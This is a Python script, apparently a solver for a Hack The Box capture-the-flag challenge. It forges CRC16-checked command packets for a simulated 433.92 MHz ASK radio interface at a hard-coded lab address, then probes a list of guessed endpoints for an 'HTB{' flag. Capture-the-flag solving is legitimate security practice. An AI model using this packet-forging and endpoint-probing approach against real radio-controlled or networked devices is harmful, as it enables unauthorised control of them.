#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 160: Enviar comandos y verificar INMEDIATAMENTE todos los endpoints
print("[*] INNOVACIÓN 160: Send and immediately check everything")

for attempt in range(5):
    print(f"\n[Attempt {attempt+1}]")
    
    s = requests.Session()
    s.get(base_url)
    
    # Enviar TODOS los comandos
    print("  Sending commands...")
    for addr, cmd in [(0xE1, 0xFF), (0xE2, 0xFF), (0xE3, 0xFF), (0xA1, 0xF1), (0xA2, 0xF1), (0xA3, 0xF1), (0xA4, 0xF1)]:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    # NO esperar, verificar INMEDIATAMENTE
    endpoints = ['/', '/updates', '/capture', '/flag', '/mission', '/escape', '/success', 
                 '/agent', '/complete', '/done', '/result', '/status', '/health']
    
    for endpoint in endpoints:
        try:
            r = s.get(f'{base_url}{endpoint}')
            if 'HTB{' in r.text:
                print(f'\n[SUCCESS in {endpoint} at attempt {attempt+1}]!')
                flags = re.findall(r'HTB\{[^}]+\}', r.text)
                for flag in flags:
                    print(flag)
                exit(0)
        except:
            pass
    
    # Esperar 5 segundos y verificar de nuevo
    time.sleep(5)
    
    for endpoint in endpoints:
        try:
            r = s.get(f'{base_url}{endpoint}')
            if 'HTB{' in r.text:
                print(f'\n[SUCCESS in {endpoint} after 5s, attempt {attempt+1}]!')
                flags = re.findall(r'HTB\{[^}]+\}', r.text)
                for flag in flags:
                    print(flag)
                exit(0)
        except:
            pass
    
    # Esperar 10 segundos más
    time.sleep(10)
    
    for endpoint in endpoints:
        try:
            r = s.get(f'{base_url}{endpoint}')
            if 'HTB{' in r.text:
                print(f'\n[SUCCESS in {endpoint} after 15s, attempt {attempt+1}]!')
                flags = re.findall(r'HTB\{[^}]+\}', r.text)
                for flag in flags:
                    print(flag)
                exit(0)
        except:
            pass

print("\n[*] Completed 5 attempts")
